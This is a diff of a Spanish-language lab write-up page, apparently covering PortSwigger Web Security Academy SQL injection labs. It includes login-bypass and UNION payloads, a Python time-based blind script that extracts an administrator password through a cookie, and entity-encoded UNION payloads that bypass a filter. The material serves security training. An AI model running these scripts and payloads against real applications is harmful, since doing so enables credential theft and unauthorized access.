@@ -28,7 +28,7 @@ Sabiendo esto hacemos la búsqueda:
 
 Podemos observar como salen 4 elementos cuando salían 3 anteriormente.
 
-<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Podemos ver que hay una inyección por lo que realizamos esta sentencia.
 
@@ -48,7 +48,7 @@ Lo ponemos en la búsqueda.
 ?category=Gifts' OR 1=1--'
 ```
 
-<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Lab: SQL injection vulnerability allowing login bypass
 
@@ -74,7 +74,7 @@ SELECT * FROM usuarios WHERE username='administrator' AND contraseña= '' OR 1=1
 
 Por lo tanto insertamos eso en el login.
 
-<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Lab: SQL injection attack, querying the database type and version on Oracle
 
@@ -310,31 +310,31 @@ La base de datos contiene una tabla diferente llamada **`users`**, con columnas 
 
 A diferencia de los laboratorios anteriores la vulnerabilidad está en **TrackingID**. Lo sabemos porque no nos sale el **Welcome Back**.
 
-<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Sabiendo esto vamos a comprobar si existe la tabla users.
 
-<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 Como vemos sí que existe la tabla users. Vamos a ver si el usuario administrador está en users.
 
-<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
 
 Sí está en la tabla de usuarios por lo que vamos a ver su contraseña. Primero debemos saber la longitud de la contraseña.&#x20;
 
-<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>
 
 Ya sabemos que la contraseña tiene longitud mayor que 1 por lo que vamos a ver cuánta longitud.
 
-<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>
 
 Vamos a comprobar los caracteres que tiene la contraseña yendo al **Intruder.**
 
-<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>
 
 Iría caracter a caracter y sabemos que la primera es una **e**. Mejor script en Python para hacerlo 20 veces o Cluster bomb.
 
-<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>
 
 Este sería el script de Python.
 
@@ -365,11 +365,11 @@ for i in range(1, 21):
 print(f"\n[+] Contraseña completa encontrada: {password}")
 ```
 
-<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>
 
 Nos logueamos con las credenciales.
 
-<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (10) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Lab 12: Blind SQL injection with conditional errors
 
@@ -565,5 +565,217 @@ Sabiendo esto miramos el siguiente payload.
 
 <figure><img src="../../.gitbook/assets/image (1468).png" alt=""><figcaption></figcaption></figure>
 
-Vamos a dormir la base de datos si existe el usuario en la tabla users.
+Vamos a dormir la base de datos si existe el usuario en la tabla users.&#x20;
 
+<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+Como tarda 10 segundos sí existe el usuario. Ahora toca ver su contraseña.
+
+<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+Observamos que tarda 10 segundos por lo que la contraseña tiene 20 caracteres.
+
+<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+Como en los laboratorios anteriores se podría construir la contraseña en Cluster Bomb o de manera automática en Python.
+
+```
+import requests
+import string
+import urllib.parse
+import urllib3
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+url = 'https://0a0b008504a1eb638154611b005c00f9.web-security-academy.net/'
+payload = "'||(select case when (username='administrator' and substring(password,{},1)='{}') then pg_sleep(10) else pg_sleep(2) end from users)--"
+characters = string.printable
+
+password = ''
+
+for i in range(1, 21):
+    for char in characters:
+        cookie = {'TrackingId': 'TIHGzblAUd3dagoi' + payload.format(i, char)}
+        r = requests.get(url, cookies=cookie, verify=False)
+        if int(r.elapsed.total_seconds()) > 9:
+            password += char
+            break
+
+    print("[x] La contraseña es: {}".format(password))
+```
+
+<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+
+## Lab: Blind SQL injection with out-of-band interaction
+
+### Enunciado
+
+**Este laboratorio contiene una vulnerabilidad de inyección SQL ciega.**
+
+La aplicación utiliza una cookie de seguimiento (_tracking cookie_) para análisis, y ejecuta una consulta SQL que incluye el valor de la cookie enviada.
+
+La consulta SQL se ejecuta de forma **asíncrona** y no tiene ningún efecto en la respuesta de la aplicación. Sin embargo, puedes provocar interacciones _out-of-band_ (fuera de banda) con un dominio externo.
+
+**Para resolver el laboratorio**, explota la vulnerabilidad de inyección SQL para causar una consulta DNS (DNS lookup) hacia un dominio de Burp Collaborator.
+
+### Resolución
+
+Miramos en el cheatsheet como sería la consulta a realizar.
+
+{% hint style="info" %}
+Ester laboratorio se hace con BurpSuite Professional
+{% endhint %}
+
+<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+
+Generamos 1 payload en **Collaborator** y lo copiamos en la consulta.
+
+<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-06-28 165113.png" alt=""><figcaption></figcaption></figure>
+
+Vemos como en la ventana de **Collaborator** al enviarlo se ven las DNS y así completamos el laboratorio.
+
+<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-06-28 165329.png" alt=""><figcaption></figcaption></figure>
+
+## Lab: Blind SQL injection with out-of-band data exfiltration
+
+### Enunciado
+
+**Este laboratorio contiene una vulnerabilidad de inyección SQL ciega.**
+
+La aplicación utiliza una cookie de seguimiento (_tracking cookie_) para fines de análisis y ejecuta una consulta SQL que incluye el valor de la cookie enviada.
+
+La consulta SQL se ejecuta de forma **asíncrona** y no tiene ningún efecto en la respuesta de la aplicación. Sin embargo, puedes provocar interacciones _out-of-band_ (fuera de banda) con un dominio externo.
+
+La base de datos contiene una tabla diferente llamada **users**, con columnas llamadas **username** y **password**. Debes explotar la vulnerabilidad de inyección SQL ciega para averiguar la contraseña del usuario **administrator**.
+
+**Para resolver el laboratorio, inicia sesión como el usuario administrator.**
+
+### Resolución
+
+Interceptamos y realizamos la consulta correspondiente a Oracle con el payload generado en **Collaborator**.
+
+{% hint style="info" %}
+Este laboratorio se hace con BurpSuite Professional
+{% endhint %}
+
+<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-06-28 171036.png" alt=""><figcaption></figcaption></figure>
+
+Vemos que antes del punto es la contraseña correspondiente al usuario y al logueanos con dichas credenciales completamos el laboratorio.
+
+<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-06-28 171018.png" alt=""><figcaption></figcaption></figure>
+
+## Lab: SQL injection with filter bypass via XML encoding
+
+### Enunciado
+
+**Este laboratorio contiene una vulnerabilidad de inyección SQL en su funcionalidad de verificación de stock.**
+
+Los resultados de la consulta se devuelven en la respuesta de la aplicación, por lo que puedes utilizar un ataque **UNION** para recuperar datos de otras tablas.
+
+La base de datos contiene una tabla **users**, que almacena los nombres de usuario y contraseñas de los usuarios registrados.
+
+**Para resolver el laboratorio, realiza un ataque de inyección SQL para obtener las credenciales del usuario admin y luego inicia sesión en su cuenta.**
+
+### Resolución
+
+La vulnerabilidad está en el stock del producto.
+
+<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+
+Las consultas básicas maliciosas las detecta como ataques.
+
+<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+
+Probamos a urlcodearlas.
+
+<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
+
+Ya no nos sale lo del ataque así que vamos a ver cuántas columnas tiene.
+
+<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+
+Cuando queremos saber s hay más de una columna nos sale que no hay unidades. Hacemos un script de Python para automatizar eso.
+
+```
+#!/usr/bin/python3
+
+import requests
+
+def main():
+    url = 'https://0a4300460442812480ea1c8e008e0015.web-security-academy.net/product/stock'
+
+    cookie = {
+        'session': 'Ekz8u97zV5O9DK8grBFoVxJpUzL3DuaH'
+    }
+
+    header = {
+        'Content-Type': 'application/xml'
+    }
+
+    # UNION SELECT NULL
+    payload = '&#85;&#78;&#73;&#79;&#78;&#32;&#83;&#69;&#76;&#69;&#67;&#84;&#32;&#78;&#85;&#76;&#76;'
+    
+    xml = f'''<?xml version="1.0" encoding="UTF-8"?>
+    <stockCheck>
+        <productId>1</productId>
+        <storeId>1 {payload}</storeId>
+    </stockCheck>'''
+
+    print(requests.post(url, cookies=cookie, headers=header, data=xml).text)
+
+if __name__ == '__main__':
+    main()
+```
+
+<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+
+Cambio el payload para ver si acepta la columna cadena de texto.
+
+```
+# UNION SELECT 'string'
+payload = '&#85;&#78;&#73;&#79;&#78;&#32;&#83;&#69;&#76;&#69;&#67;&#84;&#32;&#39;&#115;&#116;&#114;&#105;&#110;&#103;&#39;'
+```
+
+<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
+
+Sí acepta cadenas de texto por lo que vemos qué base de datos usa.
+
+```
+# UNION SELECT version()
+payload = '&#85;&#78;&#73;&#79;&#78;&#32;&#83;&#69;&#76;&#69;&#67;&#84;&#32;&#118;&#101;&#114;&#115;&#105;&#111;&#110;&#40;&#41;'
+```
+
+<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
+
+Sabiendo eso vemos la consulta para ver si tiene una tabla usuarios.
+
+```
+# UNION SELECT table_name FROM information_schema.tables
+payload = '&#85;&#78;&#73;&#79;&#78;&#32;&#83;&#69;&#76;&#69;&#67;&#84;&#32;&#116;&#97;&#98;&#108;&#101;&#95;&#110;&#97;&#109;&#101;&#32;&#70;&#82;&#79;&#77;&#32;&#105;&#110;&#102;&#111;&#114;&#109;&#97;&#116;&#105;&#111;&#110;&#95;&#115;&#99;&#104;&#101;&#109;&#97;&#46;&#116;&#97;&#98;&#108;&#101;&#115;'
+```
+
+<figure><img src="../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>
+
+Vamos a ver las columnas de la tabla.
+
+```
+# UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'
+payload = '&#85;&#78;&#73;&#79;&#78;&#32;&#83;&#69;&#76;&#69;&#67;&#84;&#32;&#99;&#111;&#108;&#117;&#109;&#110;&#95;&#110;&#97;&#109;&#101;&#32;&#70;&#82;&#79;&#77;&#32;&#105;&#110;&#102;&#111;&#114;&#109;&#97;&#116;&#105;&#111;&#110;&#95;&#115;&#99;&#104;&#101;&#109;&#97;&#46;&#99;&#111;&#108;&#117;&#109;&#110;&#115;&#32;&#87;&#72;&#69;&#82;&#69;&#32;&#116;&#97;&#98;&#108;&#101;&#95;&#110;&#97;&#109;&#101;&#61;&#39;&#117;&#115;&#101;&#114;&#115;&#39;'
+```
+
+<figure><img src="../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>
+
+Extraemos toda la información.
+
+```
+# UNION SELECT username||':'||password FROM users
+payload = '&#85;&#78;&#73;&#79;&#78;&#32;&#83;&#69;&#76;&#69;&#67;&#84;&#32;&#117;&#115;&#101;&#114;&#110;&#97;&#109;&#101;&#124;&#124;&#39;&#58;&#39;&#124;&#124;&#112;&#97;&#115;&#115;&#119;&#111;&#114;&#100;&#32;&#70;&#82;&#79;&#77;&#32;&#117;&#115;&#101;&#114;&#115;'
+```
+
+<figure><img src="../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>
+
+Nos logueamos.
+
+<figure><img src="../../.gitbook/assets/image (1469).png" alt=""><figcaption></figcaption></figure>
